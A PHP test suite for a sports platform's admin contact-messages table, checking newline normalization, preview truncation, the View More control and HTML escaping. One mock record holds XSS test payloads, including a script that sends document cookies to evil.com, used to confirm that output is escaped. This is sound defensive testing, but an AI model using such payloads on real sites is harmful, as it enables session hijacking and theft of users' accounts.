<?php

require_once __DIR__ . '/../app/bootstrap.php';

echo "==================================================\n";
echo " BENCHERO ADMIN CONTACT MESSAGES & UI SUITE\n";
echo "==================================================\n";

$passes = 0;
$fails = 0;

function assertCondition(bool $condition, string $description) {
    global $passes, $fails;
    if ($condition) {
        echo " [PASS] {$description}\n";
        $passes++;
    } else {
        echo " [FAIL] {$description}\n";
        $fails++;
    }
}

// ----------------------------------------------------
// 1. Helper Unit Tests: normalize_contact_message
// ----------------------------------------------------
echo "\n--- 1. normalize_contact_message() tests ---\n";

$sampleEntities1 = "Hello&#13;&#10;World";
assertCondition(
    normalize_contact_message($sampleEntities1) === "Hello\nWorld",
    "Decimal CRLF entities (&#13;&#10;) converted to \\n"
);

$sampleEntitiesHex = "Line1&#x0d;&#x0a;Line2";
assertCondition(
    normalize_contact_message($sampleEntitiesHex) === "Line1\nLine2",
    "Hex CRLF entities (&#x0d;&#x0a;) converted to \\n"
);

$sampleEntitiesPadded = "Alpha&#013;&#010;Beta";
assertCondition(
    normalize_contact_message($sampleEntitiesPadded) === "Alpha\nBeta",
    "Padded decimal entities (&#013;&#010;) converted to \\n"
);

$sampleNewLineEntity = "First&NewLine;Second";
assertCondition(
    normalize_contact_message($sampleNewLineEntity) === "First\nSecond",
    "&NewLine; entity converted to \\n"
);

$sampleDoubleEncoded = "Double&amp;#13;&amp;#10;Encoded";
assertCondition(
    normalize_contact_message($sampleDoubleEncoded) === "Double\nEncoded",
    "Double-encoded &amp;#13;&amp;#10; converted to \\n"
);

$sampleWindowsCRLF = "Win1\r\nWin2\r\nWin3";
assertCondition(
    normalize_contact_message($sampleWindowsCRLF) === "Win1\nWin2\nWin3",
    "Standard \\r\\n converted to \\n"
);

$sampleOldMacCR = "Mac1\rMac2";
assertCondition(
    normalize_contact_message($sampleOldMacCR) === "Mac1\nMac2",
    "Isolated \\r converted to \\n"
);

$sampleXss = "<script>alert('xss')</script>&#13;&#10;<img src=x onerror=alert(1)>";
$normXss = normalize_contact_message($sampleXss);
assertCondition(
    str_contains($normXss, "<script>alert('xss')</script>\n<img src=x onerror=alert(1)>"),
    "HTML and script tags are untouched during newline normalization (no unsafe decoding)"
);
assertCondition(
    !str_contains($normXss, "&#13;&#10;"),
    "Newline entity removed from malicious payload"
);

// ----------------------------------------------------
// 2. Helper Unit Tests: contact_message_preview
// ----------------------------------------------------
echo "\n--- 2. contact_message_preview() tests ---\n";

$shortMsg = "Hello team";
assertCondition(
    contact_message_preview($shortMsg, 140) === "Hello team",
    "Short message preview is exact content"
);

$multiLineMsg = "Hi coach,\r\n\r\nCan I join practice today?\r\nThanks!";
$prevMulti = contact_message_preview($multiLineMsg, 140);
assertCondition(
    $prevMulti === "Hi coach, Can I join practice today? Thanks!",
    "Multi-line message collapsed into single-line space-separated preview"
);

$longMsg = "A legal way to send commercial offers. Hi there! It is possible to send business messages. We provide a full-service marketing campaign that can help your sports academy reach thousands of parents across the country.";
$prevLong = contact_message_preview($longMsg, 80);
assertCondition(
    str_ends_with($prevLong, '...') && mb_strlen($prevLong) === 83,
    "Long message preview is cleanly truncated to character limit with ellipsis"
);

// ----------------------------------------------------
// 3. Helper Unit Tests: contact_message_needs_expansion
// ----------------------------------------------------
echo "\n--- 3. contact_message_needs_expansion() tests ---\n";

assertCondition(
    contact_message_needs_expansion("Short message", 140) === false,
    "Short single-line message does NOT need expansion"
);

assertCondition(
    contact_message_needs_expansion("Line 1\nLine 2", 140) === true,
    "Multi-line message needs expansion to view full line-broken format"
);

assertCondition(
    contact_message_needs_expansion("Line 1&#13;&#10;Line 2", 140) === true,
    "Entity-encoded newline message needs expansion"
);

assertCondition(
    contact_message_needs_expansion(str_repeat("a", 200), 140) === true,
    "Message longer than 140 chars needs expansion"
);

// ----------------------------------------------------
// 4. View Rendering Integration Test (Mock Messages)
// ----------------------------------------------------
echo "\n--- 4. View Rendering & UI Elements Integration Test ---\n";

$testMessages = [
    [
        'id' => 'MSG_SHORT_001',
        'organization_id' => null,
        'org_name' => null,
        'name' => 'Alice Short',
        'email' => 'alice@example.com',
        'subject' => 'Quick Question',
        'message' => 'Are tickets available for tomorrow?',
        'status' => 'read',
        'created_at' => '2026-09-28 10:15:00'
    ],
    [
        'id' => 'MSG_LONG_002',
        'organization_id' => 'ORG_001',
        'org_name' => 'Cheeter FC',
        'name' => 'Andrew Reill',
        'email' => 'no.reply.PersJohansson@gmail.com',
        'subject' => 'A legal way to send commercial offers',
        'message' => "Hi there! It is possible to send business messages&#13;&#10;We provide full automated outreach to thousands of verified contacts.&#13;&#10;Check our offer at https://example.com/offers-2026-special-discount-packages-for-sports-teams-and-academies&#13;&#10;Best regards,\r\nAndrew",
        'status' => 'unread',
        'created_at' => '2026-09-27 09:43:21'
    ],
    [
        'id' => 'MSG_XSS_003',
        'organization_id' => null,
        'org_name' => null,
        'name' => '<script>alert("attacker")</script>',
        'email' => 'hacker+test@security-audit.benchero.co.ke',
        'subject' => '<img src=x onerror=alert(1)> Urgent Notice',
        'message' => "<script>document.location='http://evil.com/steal?c='+document.cookie</script>&#13;&#10;Check this normal paragraph.",
        'status' => 'unread',
        'created_at' => '2026-09-26 14:02:00'
    ]
];

// Capture rendering output of the contact inquiries table component logic
ob_start();
$recentMessages = $testMessages;
$stats = ['contact_messages' => 12, 'unread_messages' => 2];
?>
<!-- Test Container -->
<div class="card border-0 shadow-sm rounded-4 p-4 bg-white mb-5">
    <div class="d-flex flex-column flex-md-row justify-content-between align-items-md-center gap-2 mb-3">
        <h5 class="fw-bold mb-0">
            <i class="bi bi-envelope-paper text-danger me-2"></i>Recent Platform & Club Contact Inquiries
        </h5>
        <span class="badge bg-light text-secondary border px-3 py-2">
            <i class="bi bi-inbox me-1"></i><?= count($recentMessages) ?> recent of <?= number_format($stats['contact_messages']) ?> total
        </span>
    </div>

    <div class="table-responsive">
        <table class="table table-hover align-middle mb-0 contact-inquiries-table">
            <thead class="table-light">
                <tr>
                    <th style="width: 18%; min-width: 150px;">Recipient / Destination</th>
                    <th style="width: 22%; min-width: 175px;">Sender</th>
                    <th style="width: 44%; min-width: 280px;">Subject & Preview</th>
                    <th style="width: 6%; min-width: 85px;" class="text-center">Status</th>
                    <th style="width: 10%; min-width: 120px;">Received Date</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($recentMessages as $m): ?>
                    <?php
                        $normalizedMsg = normalize_contact_message($m['message'] ?? '');
                        $previewMsg = contact_message_preview($m['message'] ?? '', 140);
                        $needsExpansion = contact_message_needs_expansion($m['message'] ?? '', 140);
                        $msgDomId = 'contact-msg-' . htmlspecialchars($m['id']);
                    ?>
                    <tr>
                        <td>
                            <?php if (empty($m['organization_id'])): ?>
                                <span class="badge bg-dark text-white d-inline-flex align-items-center py-1 px-2 fw-medium text-wrap text-start" style="max-width: 100%;">
                                    <i class="bi bi-globe me-1 flex-shrink-0"></i><span>Benchero Platform</span>
                                </span>
                            <?php else: ?>
                                <span class="badge bg-primary-subtle text-primary border border-primary-subtle d-inline-flex align-items-center py-1 px-2 fw-semibold text-wrap text-start" style="max-width: 100%;">
                                    <i class="bi bi-shield me-1 flex-shrink-0"></i><span><?= htmlspecialchars($m['org_name'] ?? 'Club') ?></span>
                                </span>
                            <?php endif; ?>
                        </td>
                        <td>
                            <div class="fw-bold text-dark small mb-0"><?= htmlspecialchars($m['name']) ?></div>
                            <div class="small contact-sender-email">
                                <a href="mailto:<?= htmlspecialchars($m['email']) ?>" class="text-decoration-none text-primary" title="<?= htmlspecialchars($m['email']) ?>">
                                    <i class="bi bi-envelope me-1 text-muted"></i><?= htmlspecialchars($m['email']) ?>
                                </a>
                            </div>
                        </td>
                        <td>
                            <div class="fw-semibold text-dark small mb-1"><?= htmlspecialchars($m['subject'] ?: '(No Subject)') ?></div>
                            <div class="contact-message-wrapper" id="<?= $msgDomId ?>-wrapper">
                                <div class="contact-message-preview small" id="<?= $msgDomId ?>-preview">
                                    <?= htmlspecialchars($previewMsg) ?>
                                </div>
                                <?php if ($needsExpansion): ?>
                                    <div class="contact-message-full d-none" id="<?= $msgDomId ?>-full" aria-hidden="true">
                                        <?= htmlspecialchars($normalizedMsg) ?>
                                    </div>
                                    <button type="button" 
                                            class="contact-expand-btn" 
                                            data-target-id="<?= $msgDomId ?>" 
                                            aria-expanded="false" 
                                            aria-controls="<?= $msgDomId ?>-full">
                                        <span class="expand-btn-text">View More</span>
                                        <i class="bi bi-chevron-down expand-btn-icon" aria-hidden="true"></i>
                                    </button>
                                <?php endif; ?>
                            </div>
                        </td>
                        <td class="text-center">
                            <?php if ($m['status'] === 'unread'): ?>
                                <span class="badge bg-warning text-dark px-2 py-1"><i class="bi bi-envelope-fill me-1"></i>Unread</span>
                            <?php else: ?>
                                <span class="badge bg-light text-muted border px-2 py-1"><i class="bi bi-envelope-open me-1"></i>Read</span>
                            <?php endif; ?>
                        </td>
                        <td class="small text-muted text-nowrap">
                            <div class="fw-semibold text-dark"><?= date('M j, Y', strtotime($m['created_at'])) ?></div>
                            <div class="text-muted" style="font-size: 0.8rem;"><i class="bi bi-clock me-1"></i><?= date('H:i', strtotime($m['created_at'])) ?></div>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>
<?php
$renderedHtml = ob_get_clean();

// Validation checks on rendered output
assertCondition(
    !str_contains($renderedHtml, '&#13;&#10;') && !str_contains($renderedHtml, '&amp;#13;&amp;#10;'),
    "Rendered HTML does NOT display raw &#13;&#10; or &amp;#13;&amp;#10; anywhere"
);

assertCondition(
    !str_contains($renderedHtml, '<script>alert'),
    "XSS payload <script>alert is never executed or unescaped in rendered HTML"
);

assertCondition(
    str_contains($renderedHtml, '&lt;script&gt;document.location='),
    "Malicious script in message is safely HTML-escaped (&lt;script&gt;)"
);

assertCondition(
    str_contains($renderedHtml, '&lt;script&gt;alert(&quot;attacker&quot;)&lt;/script&gt;'),
    "Malicious script in sender name is safely HTML-escaped"
);

assertCondition(
    str_contains($renderedHtml, '&lt;img src=x onerror=alert(1)&gt; Urgent Notice'),
    "Malicious img tag in subject is safely HTML-escaped"
);

// Check short message: no button
assertCondition(
    !str_contains($renderedHtml, 'data-target-id="contact-msg-MSG_SHORT_001"'),
    "Short message (MSG_SHORT_001) does NOT render unnecessary View More button"
);

// Check long message: button exists with accessibility attributes
assertCondition(
    str_contains($renderedHtml, 'data-target-id="contact-msg-MSG_LONG_002"'),
    "Long message (MSG_LONG_002) renders View More button with data-target-id"
);

assertCondition(
    str_contains($renderedHtml, 'aria-expanded="false"') && str_contains($renderedHtml, 'aria-controls="contact-msg-MSG_LONG_002-full"'),
    "View More button has correct aria-expanded and aria-controls attributes"
);

assertCondition(
    str_contains($renderedHtml, 'class="contact-message-full d-none" id="contact-msg-MSG_LONG_002-full"'),
    "Full message container has contact-message-full class and initial d-none state"
);

assertCondition(
    str_contains($renderedHtml, 'contact-sender-email') && str_contains($renderedHtml, 'no.reply.PersJohansson@gmail.com'),
    "Sender email is rendered with contact-sender-email class for overflow-wrap"
);

assertCondition(
    str_contains($renderedHtml, 'contact-inquiries-table'),
    "Table contains contact-inquiries-table class with balanced min-widths"
);

echo "==================================================\n";
echo " SUMMARY: Passed {$passes} / Failed {$fails}\n";
echo "==================================================\n";

exit($fails > 0 ? 1 : 0);
